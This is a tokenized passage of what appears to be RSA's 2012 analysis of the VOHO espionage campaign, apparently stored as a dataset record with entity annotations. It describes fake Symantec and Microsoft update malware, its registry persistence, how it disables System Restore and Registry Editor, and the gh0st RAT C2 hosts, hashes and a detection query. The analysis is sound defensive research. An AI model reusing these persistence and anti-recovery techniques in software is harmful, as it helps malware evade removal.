["Registry", "Editor", "is", "disabled"], ["\u2022"], ["Windows", "System", "Restore", "is", "disabled"], ["Disabling", "the", "registry", "editor", "prevents", "the", "auditing", "and", "review", "of", "registry", "entries", ",", "especially"], ["those", "that", "are", "commonly", "utilized", "by", "malware", "for", "persistency", "while", "the", "disabling", "of", "Windows"], ["System", "Restore", "prevents", "the", "user", "from", "reverting", "the", "system", "to", "a", "known", "good", "state", "before"], ["infection", "occurred", ".", "The", "malware", "also", "wipes", "out", "all", "the", "restore", "points", "that", "are", "present", "in", "the"], ["system", "before", "infection", "."], ["The", "main", "component", ",", "VPTray", ".", "EXE,", "is", "the", "one", "that", "communicates", "directly", "to", "the", "botnet"], ["command", "and", "control", ".", "It", "connects", "to", "IP", "134", ".", "255.242.47", "via", "HTTPS", ".", "It", "remains", "active", "in", "the"], ["system", "listening", "constantly", "for", "instructions", "while", "keeping", "the", "other", "components", "in", "check", "."], ["Figure", "10:", "VPTray", ".", "exe", "connecting"], ["to", "IP", "134", ".", "255.242.47."], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system:"], ["\u2022"], ["Presence", "of", "VPTray", ".", "EXE", "and", "UP", ".", "BAK", "in", "the", "User\u2019s", "\u201cLocal", "Settings\\Temp\u201d", "folder", ".", "An"], ["infected", "Administrator", "account", "in", "Windows", "XP", "will", "have", "these", "files", "in", "C:\\DOCUMENTS"], ["AND", "SETTINGS\\ADMINISTRATOR\\LOCAL", "SETTINGS\\Temp\\"], ["\u2022"], ["Presence", "of", "the", "registry", "value", "\u201cSymantecUpdate\u201d", "with", "data", "in", "HEX", "values"], ["representing", "the", "file", "and", "location", "of", "VPTray", ".", "EXE", "in", "the", "following", "registry", "keys:"], ["o"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["o"], ["HKEY_USERS\\<User\u2019s", "Security"], ["ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["Presence", "of", "running", "process", "VPTray", ".", "EXE"], ["\u2022"], ["Unable", "to", "use", "the", "Registry", "Editor"], ["\u2022"], ["Unable", "to", "use", "Windows", "System", "Restore"], ["Fake", "Symantec", "Update", "\u2013", "Variant", "2"], ["Dropper"], ["acc583fc596d38626d37cbf6de8a01cb"], ["VPTray", ".", "EXE"], ["b894efe4173f90479fddff455daf6ff3"], ["Unlike", "the", "first", "variant", ",", "this", "one", "is", "not", "compressed", ".", "Both", "the", "dropper", "and", "the", "dropped", "file"], ["(VPTray", ".", "EXE)", "are", "not", "compressed", ".", "Other", "difference", "it", "has", "with", "the", "first", "variant", "is", "the", "location"], ["of", "the", "dropped", "file", "and", "the", "way", "persistency", "is", "achieved", ".", "But", "its", "modus", "operandi", "remains", "the"], ["same", ",", "and", "that", "is", "to", "pretend", "to", "be", "a", "Symantec", "Live", "Update", "."], ["When", "the", "dropper", "is", "executed", ",", "it", "drops", "VPTray", ".", "EXE", "in", "C:\\Program", "Files\\Symantec\\LiveUpdate\\", "."], ["Having", "these", "file", "in", "a", "Symantec", "folder", "in", "Program", "Files", "is", "already", "a", "red", "flag", "especially", "if", "the"], ["compromised", "machine", "does", "not", "have", "a", "Symantec", "product", "installed", "."], ["13"], ["It", "then", "adds", "the", "registry", "key", "below", "to", "achieve", "persistency", "."], ["\u2022"], ["Key:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run"], ["\u2022"], ["Value:", "Symantec", "LiveUpdate"], ["\u2022"], ["Data:", "C:\\Program", "Files\\Symantec\\LiveUpdate\\VPTray", ".", "exe"], ["Obviously", ",", "the", "way", "it", "achieves", "persistency", "is", "totally", "different", "from", "variant", "1", "."], ["\u2022"], ["Variant", "2", "used", "a", "different", "registry", "hive"], ["\u2022"], ["Variant", "2\u2019s", "registry", "value", "is", "SymantecLiveUpdate", "compared", "to", "SymantecUpdate", "in"], ["variant", "1"], ["\u2022"], ["The", "registry", "data", "is", "in", "ASCII", "and", "not", "in", "HEX", ".", "This", "is", "fine", "because", "the", "malware", "file", "is"], ["located", "in", "a", "created", "Symantec", "folder", "in", "Program", "Files", "."], ["Figure", "11:", "Memory", "Dump", "of", "the"], ["Malware", "Containing", "the", "Strings", "of", "the"], ["Filenames"], ["To", "ensure", "its", "survival", ",", "the", "Windows", "System", "Restore", "is", "disabled", ".", "But", "unlike", "the", "first", "variant", ","], ["this", "one", "did", "not", "disable", "the", "registry", "editor", "due", "to", "the", "fact", "that", "the", "added", "registry", "value", "and"], ["data", "appears", "to", "be", "legitimate", "because", "it", "utilizes", "a", "location", "of", "the", "file", "that", "appears", "to", "be", "a"], ["normal", "location", "for", "a", "Symantec", "file", "."], ["To", "communicate", "to", "the", "attacker", "the", "main", "component", ",", "VPTray", ".", "EXE,", "connects", "to", "the", "domain"], ["usc-data", ".", "suroot.com."], ["14"], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system:"], ["\u2022"], ["Presence", "of", "VPTray", ".", "EXE", "in", "C:\\Program", "Files\\Symantec\\LiveUpdate\\"], ["\u2022"], ["Presence", "of", "the", "registry", "value", "\u201cSymantecLiveUpdate\u201d", "with", "the", "data", "\u201cC:\\Program"], ["Files\\Symantec\\LiveUpdate\\VPTray", ".", "EXE\u201d", "in"], ["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run"], ["\u2022"], ["Presence", "of", "running", "process", "VPTray", ".", "EXE"], ["\u2022"], ["Unable", "to", "use", "Windows", "System", "Restore"], ["**", "As", "of", "this", "writing", ",", "the", "main", "component", ",", "VPTray", ".", "EXE,", "is", "not", "detected", "in", "VirusTotal", "using", "its"], ["hash", "search", "function", "."], ["Fake", "Microsoft", "Update"], ["Svohost", ".", "EXE"], ["2fe340fe2574ae540bd98bd9af8ec67d"], ["Similar", "to", "the", "Fake", "Symantec", "Update", ",", "this", "malware", "comes", "in", "a", "UPX", "compressed", "binary", "file", ".", "It"], ["passes", "itself", "off", "as", "a", "Microsoft", "update", "but", "nothing", "can", "be", "further", "from", "the", "truth", "."], ["When", "the", "malware", "is", "first", "executed", ",", "it", "installs", "itself", "in", "the", "system", "similar", "to", "the", "method"], ["employed", "by", "the", "Fake", "Symantec", "Update", ".", "The", "only", "difference", "is", "the", "file", "that", "is", "dropped", "and"], ["registry", "value", "and", "data", "it", "uses", ".", "The", "file", "is", "dropped", "in", "the", "current", "user\u2019s", "\u201cLocal", "Settings\\Temp\u201d"], ["folder", "and", "is", "named", "SVOHOST", ".", "EXE,", "which", "is", "an", "exact", "copy", "of", "the", "malware", ".", "This", "technique", "of"], ["naming", "a", "file", "almost", "similar", "to", "a", "legitimate", "file", "(SVCHOST", ".", "EXE)", "is", "known", "as", "homographic"], ["obfuscation", ".", "But", "in", "this", "case", ",", "the", "less", "elegant", "method", "is", "used", ",", "and", "that", "is", "to", "simply", "replace", "one"], ["letter", "with", "another", ".", "To", "autostart", ",", "the", "malware", "utilized", "the", "same", "registry", "keys", "as", "the", "Fake"], ["Symantec", "Update", "."], ["\u2022"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["HKEY_USERS\\<User\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["By", "using", "these", "registry", "hives", ",", "the", "malware", "is", "able", "to", "target", "users", "that", "are", "currently", "logged", "into"], ["the", "machine", "even", "those", "that", "are", "not", "currently", "active", "in", "the", "system", "(think", "of", "Switch", "User", "mode)", "."], ["The", "malware", "adds", "the", "value", "\u201cMicrosoft", "Update\u201d", "to", "these", "keys", ".", "A", "common", "technique", ",", "a", "very"], ["typical", "malware", "deception", ",", "to", "fool", "users", "into", "believing", "it", "is", "something", "that", "it", "is", "not", ".", "Aside", "from"], ["this", ",", "it", "also", "utilizes", "HEX", "digits", "to", "obfuscate", "the", "registry", "data", ",", "which", "represents", "the", "location", "and"], ["the", "filename", "of", "the", "malware", "."], ["So", "instead", "of", "the", "data", "being", "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\svohost", ".", "exe", "for", "an"], ["infected", "Administrator", "account", "in", "Windows", "XP", ",", "it", "appears", "as"], ["43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31"], [":5c:54:65:6d:70:5c:73:76:6f:68:6f:73:74:2e:65:78:65:00", "."], ["Once", "all", "the", "malware", "installation", "procedure", "is", "done", ",", "the", "original", "malware", "passes", "control", "to"], ["SVOHOST", ".", "EXE", "and", "deletes", "itself", "to", "hide", "any", "traces", "of", "its", "existence", "."], ["Once", "the", "malware", "is", "active", "in", "the", "system", "it", "utilizes", "certain", "protective", "mechanisms", "such", "as", "the"], ["following:"], ["\u2022"], ["Registry", "Editor", "is", "disabled"], ["\u2022"], ["Windows", "System", "Restore", "is", "disabled"], ["15"], ["Disabling", "the", "registry", "editor", "prevents", "the", "auditing", "and", "review", "of", "registry", "entries", ",", "especially"], ["those", "that", "are", "commonly", "utilized", "by", "malware", "for", "persistency", "while", "the", "disabling", "of", "Windows"], ["System", "Restore", "prevents", "the", "user", "from", "reverting", "the", "system", "to", "a", "known", "good", "state", "before"], ["infection", "occurred", ".", "The", "malware", "also", "wipes", "out", "all", "the", "restore", "points", "that", "are", "present", "in", "the"], ["system", "before", "infection", ".", "To", "communicate", "to", "the", "attacker", ",", "the", "malware", "connects", "to", "IP"], ["58", ".", "64.155.59."], ["Figure", "12:", "SVOHOST", ".", "EXE"], ["connecting", "to", "58", ".", "64.155.59."], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system", "."], ["\u2022"], ["Presence", "of", "SVOHOST", ".", "EXE", "in", "the", "User\u2019s", "\u201cLocal", "Settings\\Temp\u201d", "folder", ".", "An", "infected"], ["Administrator", "account", "in", "Windows", "XP", "will", "have", "these", "files", "in", "C:\\DOCUMENTS", "AND"], ["SETTINGS\\ADMINISTRATOR\\LOCAL", "SETTINGS\\Temp\\"], ["\u2022"], ["Presence", "of", "the", "registry", "value", "\u201cMicrosoft", "Update\u201d", "with", "data", "in", "HEX", "values", "representing"], ["the", "file", "and", "location", "of", "SVOHOST", ".", "EXE", "in", "the", "following", "registry", "keys:"], ["o"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["o"], ["HKEY_USERS\\<User\u2019s", "Security"], ["ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["Presence", "of", "running", "process", "SVOHOST", ".", "EXE"], ["\u2022"], ["Unable", "to", "use", "the", "Registry", "Editor"], ["\u2022"], ["Unable", "to", "use", "Windows", "System", "Restore"], ["VOHO", "Campaign", "Analysis"], ["RSA", "FirstWatch", "research", "examined", "HTTP", "logs", "covering", "the", "June/July", "2012", "timeframe", "for", "the"], ["exploit", "chain", "in", "this", "example", ".", "This", "analysis", ",", "combined", "with", "a", "detailed", "understanding", "of", "the"], ["exploit", "mechanism", ",", "allowed", "the", "team", "to", "get", "a", "better", "understanding", "of", "the", "scope", "of"], ["compromise", "of", "this", "campaign", "."], ["Based", "on", "our", "analysis", ",", "we", "can", "determine", "that", "this", "attack", "was", "broken", "up", "into", "two", "phases", "."], ["Phase", "1"], ["We", "observed", "referral", "traffic", "begin", "on", "June", "25", ",", "2012", "to", "the", "exploit", "site", ".", "However", ",", "according", "to"], ["the", "server", "logs", ",", "actual", "exploitation", "of", "Internet", "Explorer", "began", "on", "July", "9", ",", "2012", "at", "approximately"], ["7:56", "AM", "EST", "when", "the", "first", "successful", "exploits", "of", "visiting", "browsers", "began", "to", "hit", "the", "exploit"], ["code", ".", "We", "observed", "some", "movement", "of", "exploit", "code", "across", "directories", "on", "the"], ["*******curling", ".", "com", "web", "server", "during", "the", "investigation", ",", "so", "this", "gap", "was", "likely", "caused", "by", "the"], ["attacker", "setting", "up", "a", "new", "campaign", ".", "Phase", "1", "exploit", "activity", "continued", "over", "the", "course", "of", "two"], ["days", ",", "with", "continuous", "access", ",", "until", "July", "10th", ",", "when", "activity", "stopped", "at", "3:43", "pm", "EST", "."], ["Phase", "2"], ["Phase", "2", ",", "which", "consisted", "of", "the", "above", "mentioned", "attack", "on", "the", "Sun", "Java", "client", ",", "began", "on", "July"], ["16", ",", "2012", ",", "when", "the", "first", "successful", "exploits", "of", "visiting", "java", "clients", "began", "to", "hit", "the", "exploit"], ["server", "at", "approximately", "7:46am", "EST", ".", "This", "exploit", "activity", "continued", "over", "the", "course", "of", "a", "few"], ["days", ",", "and", "ceased", "on", "July", "18", ",", "2012", ",", "at", "approximately", "9:12", "am", "EST", ",", "which", "was", "when", "the", "server"], ["administrator", "of", "*******curling", ".", "com", "brought", "the", "server", "down", "for", "compromise", "remediation", "."], ["16"], ["Overall", "Statistics"], ["Based", "on", "our", "analysis", ",", "a", "total", "of", "32", ",", "160", "unique", "hosts", ",", "representing", "731", "unique", "global"], ["organizations", ",", "were", "redirected", "from", "compromised", "web", "servers", "injected", "with", "the", "redirect", "iframe"], ["to", "the", "exploit", "server", ".", "Of", "these", "redirects", ",", "3", ",", "934", "hosts", "were", "seen", "to", "download", "the", "exploit", "CAB"], ["and", "JAR", "files", "(indicating", "a", "successful", "exploit/compromise", "of", "the", "visiting", "host)", ".", "This", "gives", "a"], ["\u201csuccess\u201d", "statistic", "of", "12%", ",", "which", "based", "on", "our", "previous", "understanding", "of", "exploit", "campaigns", ","], ["indicates", "a", "very", "successful", "campaign", "."], ["Figure", "13:", "Success", "of", "Compromise"], ["Total", "Exposure", "and", "Compromise"], ["35", ",", "000"], ["30", ",", "000"], ["25", ",", "000"], ["20", ",", "000"], ["15", ",", "000"], ["10", ",", "000"], ["5", ",", "000"], ["0"], ["Total", "Exposure", "by", "Redirect"], ["Total", "Compromises"], ["Of", "the", "listed", "sites", "used", "to", "redirect", "hosts", "to", "the", "exploit", "site", ",", "the", "top", "four", "redirecting", "web", "servers"], ["are", "as", "follows:"], ["Figure", "14:", "Top", "Four", "Redirect", "Sites"], ["With", "success", "rates", "per", "exploit", "type", "being", "split", "pretty", "much", "down", "the", "middle:"], ["17"], ["Exploit", "Breakdown"], ["Figure", "15:", "Exploit", "Breakdown"], ["CAB", "Downloads"], ["JAR", "Downloads"], ["Exploited", "Organization", "Breakdown"], ["Of", "the", "hosts", "above", "that", "downloaded", "the", "exploit", "CAB", "and", "JAR", "files", ",", "the", "RSA", "FirstWatch", "team"], ["further", "examined", "compromised", "organizations", "by", "identifying", "the", "visiting", "hosts", "and", "crossreferencing", "the", "IP", "addresses", "to", "the", "Autonomous", "Systems", "that", "they", "belonged", "to", "."], ["CAVEAT:", "Because", "we", "didn\u2019t", "have", "observation", "of", "the", "compromised", "host", "themselves", ",", "nor"], ["command", "and", "control", "traffic", ",", "our", "understanding", "of", "\u201ccompromise\u201d", "is", "strictly-related", "to", "observed"], ["HTTP", "traffic", ".", "This", "analysis", "would", "not", "take", "into", "account", "host", "or", "perimeter-based", "blocking"], ["systems", "at", "affected", "organizations", "."], ["With", "this", "data", "we", "then", "grouped", "those", "autonomous", "systems", "into", "the", "following", "industries:"], ["\u2022"], ["Corporate", "\u2013", "These", "systems", "were", "identified", "as", "being", "members", "of", "typical", "corporate"], ["networks", ",", "which", "included", "enterprises", "and", "business", ",", "as", "well", "as", "\u201cbusiness-class\u201d", "IP"], ["space", "in", "large", "ISP", "organizations", "."], ["\u2022"], ["Defense", "Industrial", "Base", "(DIB)", "\u2013", "These", "systems", "were", "systems", "in", "ASNs", "that", "were"], ["\u2022"], ["Local", "Government", "\u2013", "These", "systems", "were", "systems", "in", "networks", "identified", "as"], ["known", "to", "be", "involved", "with", "DIB", "consulting", ",", "systems", "and", "process", "."], ["government", "systems", "in", "various", "cities", ",", "counties", "and", "towns", "."], ["\u2022"], ["Internet", "Service", "Provider", "(ISP)", "-", "These", "systems", "were", "hosts", "in", "networks", "that", "were"], ["identified", "as", "common", "internet", "service", "provider", "space", ".", "This", "particular", "classification"], ["accounts", "largely", "for", "consumer-based", "internet", "users", ",", "but", "may", "also", "include", "corporate"], ["assets", "that", "aren\u2019t", "immediately", "identifiable", "by", "ASN", "examination", "."], ["\u2022"], ["Federal", "Government", "\u2013", "These", "systems", "are", "hosts", "in", "U", ".", "S.", "Government", "IP", "space", "or"], ["Washington", "DC", "area", "local", "government", "space", ".", "This", "would", "include", "Federal", "agencies"], ["and", "support", "organizations", "."], ["\u2022"], ["Educational", "Institutions", "(EDU)", "\u2013", "These", "systems", "were", "hosts", "in", "networks", "identified"], ["as", "educational", "institutions", ".", "Much", "like", "ISP", "traffic", ",", "this", "traffic", "is", "difficult", "to", "breakdown"], ["into", "more", "specific", "identifying", "information", "."], ["\u2022"], ["Financial", "Services", "Organizations", "\u2013", "These", "systems", "were", "systems", "in", "identifiable"], ["Bank", ",", "Credit", "Union", ",", "Trading", "and", "other", "organizations", "related", "to", "financial", "services", "."], ["\u2022"], ["Healthcare", "-", "These", "systems", "were", "hosts", "in", "identifiable", "healthcare", "industry", "space", "."], ["This", "would", "include", "hospital", ",", "pharmaceutical", ",", "patient", "services", "and", "clinic", "space", "."], ["\u2022"], ["Other", "Government", "\u2013", "These", "systems", "were", "national", "government", "systems", "identified", "in"], ["foreign", "IP", "space", "or", "global", "government", "organizations", "(example:", "United", "Nations)"], ["\u2022"], ["Utilities", "/", "SCADA", "-", "These", "systems", "were", "hosts", "identified", "in", "organizations", "that", "supply"], ["or", "support", "utility", "or", "SCADA-related", "services", "such", "as", "Energy", "and", "water", "services", "."], ["18"], ["Figure", "16:", "Compromises", "by", "Industry"], ["Compromises", "by", "Industry"], ["UTILITIES", "/", "SCADA"], ["OTHER", "GOVT"], ["LOCAL", "GOVT"], ["ISP"], ["HEALTHCARE"], ["FINANCIAL"], ["FED", "GOVT"], ["EDU"], ["DIB"], ["CORPORATE"], ["0"], ["500"], ["1", ",", "000"], ["1", ",", "500"], ["2", ",", "000"], ["2", ",", "500"], ["By", "removing", "ISP", "traffic", ",", "we", "are", "better", "able", "to", "examine", "the", "other", "industries:"], ["Figure", "17:", "Compromise", "by", "Industry"], ["without", "ISP"], ["Compromise", "By", "Industry", "(without", "ISP)"], ["UTILITIES", "/", "SCADA"], ["OTHER", "GOVT"], ["LOCAL", "GOVT"], ["HEALTHCARE"], ["FINANCIAL"], ["FED", "GOVT"], ["EDU"], ["DIB"], ["CORPORATE"], ["0"], ["200"], ["400"], ["600"], ["800"], ["Linked", "Campaigns"], ["Wsdhealthy", ".", "com", "xxixii"], ["Based", "on", "our", "understanding", "of", "this", "campaign", "and", "TTPs", "(tools", ",", "techniques", "and", "procedures)"], ["used", ",", "we", "believe", "the", "following", "malware", "samples", "observed", "in", "January", "2012", "are", "related", "and"], ["belong", "to", "the", "same", "threat", "actors", "."], ["03db29c71b0031af08081f5e2f7dcdf2"], ["644161889f0f60885b2a0eec12038b66"], ["19"], ["These", "samples", "communicated", "with", "C2", "at", "58", ".", "64.143.245.", "This", "IP", "address", "has", "resolved", "to", "the"], ["following", "DNS", "names", "in", "the", "past:"], ["usc-data", ".", "suroot.com"], ["usa-mail", ".", "scieron.com"], ["dll", ".", "freshdns.org"], ["Delivery", "of", "these", "samples", "appeared", "to", "be", "a", "similar", "attack", "vector", ",", "that", "being", "a", "hacked", "server"], ["that", "was", "redirected", "to", "by", "iframe", "insertion:"], ["www", ".", "wsdhealthy.com"], ["Using", "the", "following", "URLs:"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet19.html"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet19.exe"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet.html"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet.jar"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet.exe"], ["This", "file", "structure", "indicates", "a", "similar", "java", "exploitation", ",", "and", "while", "we", "didn\u2019t", "have", "direct"], ["observation", "of", "this", "campaign", ",", "open", "source", "intelligence", "indicates", "a", "possible", "exploit", "of:"], ["CVE\u20132011-3544", "-", "Unspecified", "vulnerability", "in", "the", "Java", "Runtime", "Environment"], ["Additionally", ",", "the", "Gh0st", "RAT", "variant", "used", "in", "this", "campaign", "matched", "identifiers", "used", "in", "the"], ["VOHO", "campaign", "."], ["Detection", "and", "Indicators", "of", "Compromise"], ["Network"], ["For", "network", "detection", "of", "this", "threat", ",", "users", "should", "look", "for", "historic", "traffic", "to", "the", "following", "IPs"], ["and", "Domains:"], ["IP", "Addresses"], ["58", ".", "64.155.59", "(gh0st", "RAT", "C2)"], ["58", ".", "64.155.57", "(gh0st", "RAT", "C2)"], ["58", ".", "64.143.245", "(gh0st", "RAT", "C2)"], ["Domains"], ["wsdhealthy", ".", "com", "(legitimate", "site", "hosting", "exploit", "code/malware)"], ["*******curling", ".", "com", "(legitimate", "site", "hosting", "exploit", "code/malware)"], ["usc-data", ".", "suroot.com", "(gh0st", "RAT", "C2)"], ["usa-mail", ".", "scieron.com", "(gh0st", "RAT", "C2)"], ["dll", ".", "freshdns.org", "(gh0st", "RAT", "C2)"], ["20"], ["Gh0st", "RAT"], ["Generically", ",", "gh0st", "RAT", "communication", "using", "the", "unmodified", "source", "code", "can", "be", "detected", "by"], ["looking", "for", "non-RFC", "compliant", "network", "traffic", "on", "allowed", "paths", ",", "which", "contain", "the", "string"], ["\u201cGh0st\u201d", "in", "the", "first", "view", "five", "bytes", "of", "the", "packet", "payload", ".", "Because", "this", "is", "a", "commonly", "used"], ["tactic", "to", "detect", "Gh0st", "on", "the", "network", ",", "attackers", "often", "change", "this", "string", "to", "avoid", "detection", ".", "In"], ["the", "case", "of", "the", "VOHO", "compromise", ",", "this", "indicator", "is", "\u201cHTTPS\u201d", "."], ["Known", "Malicious", "MD5", "Hashes"], ["03db29c71b0031af08081f5e2f7dcdf2"], ["644161889f0f60885b2a0eec12038b66"], ["e6b43c299a9a1f5abd9be2b729e54577"], ["2fe340fe2574ae540bd98bd9af8ec67d"], ["RSA", "NetWitness", "Indicators"], ["ip", ".", "dst", "=", "58", ".", "64.155.59,58.64.155.57,58.64.143.245,64.26.174.74", "||", "alias", ".", "host", "="], ["www", ".", "wsdhealthy.com", ",usc-data", ".", "suroot.com,usa-mail.scieron.com,dll.freshdns.org"], ["Additionally", ",", "the", "following", "feeds", "and", "parsers", "from", "RSA", "NetWitness", "Live", "service", "can", "be", "used", "for"], ["additional", "Gh0st", "RAT", "detection", "."], ["Gh0st", "parser"], ["APT-domains", "feed"], ["APT-IPs", "feed"], ["Conclusions"], ["RSA", "FirstWatch", "research", "has", "revealed", "an", "exploit", "and", "compromise", "campaign", "with", "connections"], ["over", "the", "past", "8", "months", ".", "The", "collected", "data", "suggests", "that", "this", "attack", "was", "orchestrated", "and"], ["carried", "out", "by", "threat", "actors", "commonly", "referred", "to", "in", "the", "industry", "as", "\u201cAPT\u201d:"], ["1)"], ["2)"], ["3)"], ["4)"], ["5)"], ["6)"], ["Use", "of", "the", "\u201cxKungFoo\u201d", "script", "kit", "for", "victim", "redirection"], ["Use", "of", "attack", "methodology", "that", "matches", "motives", "seen", "in", "past", "APT", "attacks", "\u2013", "most"], ["notably", "such", "as", "those", "seen", "in", "the", "Aurora", "and", "GhostNet", "campaigns"], ["Use", "of", "the", "\u201cgh0st\u201d", "remote", "access", "tool", "(RAT)", "in", "this", "and", "previous", "campaigns"], ["Use", "of", "command", "and", "control", "infrastructure", "in", "the", "Hong", "Kong", "area", "in", "this", "and", "previous"], ["campaigns"], ["Gross", "impact", "and", "on", "almost", "900", "unique", "organizations"], ["Targets", "of", "Interest", "and", "Opportunity", "being", "geographically", "disperse", "in", "addition", "to"], ["industrial", "&", "vertical", "diverse", "with", "a", "heavy", "concentration", "in", "the", "following", "areas:"], ["\u2022", "International", "finance", "&", "banking"], ["\u2022", "Technology"], ["\u2022", "Government", "\u2013", "municipal", ",", "state", ",", "federal", "and", "international"], ["\u2022", "Utilities", "&", "energy"], ["\u2022", "Educational"], ["\u2022", "Defense", "Industrial", "Base", "(DIB)"], ["\u2022", "Corporate", "Enterprise"], ["The", "possibility", "exists", "that", "this", "was", "intentional", "misdirection", "on", "the", "part", "of", "the", "attackers", "in"], ["regards", "to", "their", "origin", ".", "However", ",", "the", "RSA", "FirstWatch", "team", "believes", "the", "data", "supports", "our"], ["analysis", "and", "this", "is", "further", "evidence", "of", "APT", "intrusion", "into", "United", "States", "government", "and"], ["corporate", "assets", "."], ["21"], ["Disclaimer"], ["RSA", "Security", "LLC", "(\u201cRSA\u201d)", "believes", "the", "information", "in", "this", "publication", "is", "accurate", "as", "of"], ["its", "publication", "date", ".", "RSA", "disclaims", "any", "obligation", "to", "update", "after", "the", "date", "hereof", ".", "The"], ["information", "is", "subject", "to", "update", "without", "notice", ".", "The", "analysis", "may", "include", "technical", "or"], ["other", "inaccuracies", "and/or", "typographical", "errors", "."], ["THE", "INFORMATION", "IN", "THIS", "PUBLICATION", "IS", "PROVIDED", "TO", "FOR", "INFORMATIONAL"], ["PURPOSES", "ONLY", ",", "IS", "PROVIDED", "\"AS", "IS", ",", "\"", "AND", "SHALL", "NOT", "BE", "CONSIDERED", "PRODUCT"], ["DOCUMENTATION", "OR", "SPECIFICATIONS", "UNDER", "THE", "TERMS", "OF", "ANY", "LICENSE", "OR"], ["SIMILAR", "AGREEMENT", ".", "RSA", "MAKES", "NO", "REPRESENTATIONS", "OR", "WARRANTIES", "OF", "ANY"], ["KIND", "WITH", "RESPECT", "TO", "THE", "INFORMATION", "IN", "THIS", "PUBLICATION", ",", "AND", "SPECIFICALLY"], ["DISCLAIMS", "IMPLIED", "WARRANTIES", "OF", "MERCHANTABILITY", "OR", "FITNESS", "FOR", "A"], ["PARTICULAR", "PURPOSE", "."], ["i"], ["http://www", ".", "wired.com/threatlevel/2010/01/operation-aurora/"], ["http://www", ".", "scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-EspionageNetwork"], ["iii"], ["http://googleonlinesecurity", ".", "blogspot.com/2012/06/security-warnings-for-suspected-state.html"], ["iv"], ["http://contagiodump", ".", "blogspot.com/2011/02/targeted-attacks-against-personal.html"], ["v"], ["http://thediplomat", ".", "com/flashpoints-blog/2011/06/07/china-cyber-attack-fallacies/"], ["vi"], ["http://www", ".", "yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html"], ["vii"], ["http://www", ".", "yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html"], ["viii"], ["http://www", ".", "zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmailaccounts/12462"], ["ix"], ["http://www", ".", "mcafee.com/us/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf"], ["x"], ["http://www", ".", "malwaredomainlist.com/mdl.php?search=wsdhealthy.com&colsearch=All&quantity=50"], ["xi"], ["http://www", ".", "mywot.com/en/scorecard/wsdhealthy.com"], ["xii"], ["http://www", ".", "malwaregroup.com/domains/details/wsdhealthy.com"], ["ii"], ["ABOUT", "RSA"], ["RSA", ",", "The", "Security", "Division", "of", "EMC", ",", "is", "the", "premier", "provider", "of", "security", ",", "risk"], ["and", "compliance", "management", "solutions", "for", "business", "acceleration", ".", "RSA", "helps"], ["the", "world\u2019s", "leading", "organizations", "succeed", "by", "solving", "their", "most", "complex"], ["and", "sensitive", "security", "challenges", ".", "These", "challenges", "include", "managing"], ["organizational", "risk", ",", "safeguarding", "mobile", "access", "and", "collaboration", ",", "proving"], ["compliance", ",", "and", "securing", "virtual", "and", "cloud", "environments", "."], ["Combining", "business-critical", "controls", "in", "identity", "assurance", ",", "encryption", "&"], ["key", "management", ",", "SIEM", ",", "Data", "Loss", "Prevention", "and", "Fraud", "Protection", "with"], ["industry", "leading", "eGRC", "capabilities", "and", "robust", "consulting", "services", ",", "RSA"], ["brings", "visibility", "and", "trust", "to", "millions", "of", "user", "identities", ",", "the", "transactions", "that"], ["they", "perform", "and", "the", "data", "that", "is", "generated", ".", "For", "more", "information", ",", "please"], ["visit", "www", ".", "RSA.com", "and", "www", ".", "EMC.com."], ["EMC2", ",", "EMC", ",", "RSA", ",", "FirstWatch", ",", "NetWitness", "and", "the", "RSA", "logo", "are", "registered", "trademarks", "or", "trademarks", "of"], ["EMC", "Corporation", "in", "the", "United", "States", "and", "other", "countries", ".", "All", "other", "trademarks", "used", "herein", "are", "the"], ["property", "of", "their", "respective", "owners", ".", "\u00a92012", "EMC", "Corporation", ".", "All", "rights", "reserved", ".", "Published", "in", "the", "USA", "."], ["www", ".", "emc.com/rsa"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "W32Flamer", "sent_id": 26, "pos": []}, {"old_id": "T2", "type": "Region", "name": "Middle East", "sent_id": 27, "pos": [1, 2]}, {"old_id": "T3", "type": "Organization", "name": "Symantec", "sent_id": 30, "pos": [2]}, {"old_id": "T4", "type": "Organization", "name": "CERT-Bund/BSI", "sent_id": 39, "pos": [2]}, {"old_id": "T5", "type": "Organization", "name": "IMPACT", "sent_id": 39, "pos": [4]}, {"old_id": "T6", "type": "Organization", "name": "Kaspersky", "sent_id": 39, "pos": [7]}, {"old_id": "T7", "type": "Time", "name": "May 18 2012", "sent_id": 45, "pos": [7, 10]}, {"old_id": "T8", "type": "Attacker", "name": "Flamer", "sent_id": 43, "pos": [6]}, {"old_id": "T9", "type": "Time", "name": "March 25 2012", "sent_id": 47, "pos": [15, 18]}, {"old_id": "T10", "type": "MalwareCharacteristics", "name": "record a minimal amount of information", "sent_id": 49, "pos": [7, 12]}, {"old_id": "T11", "type": "Indicator", "name": "Newsforyou", "sent_id": 73, "pos": [0]}, {"old_id": "T12", "type": "Malware", "name": "W32Flamer", "sent_id": 74, "pos": []}, {"old_id": 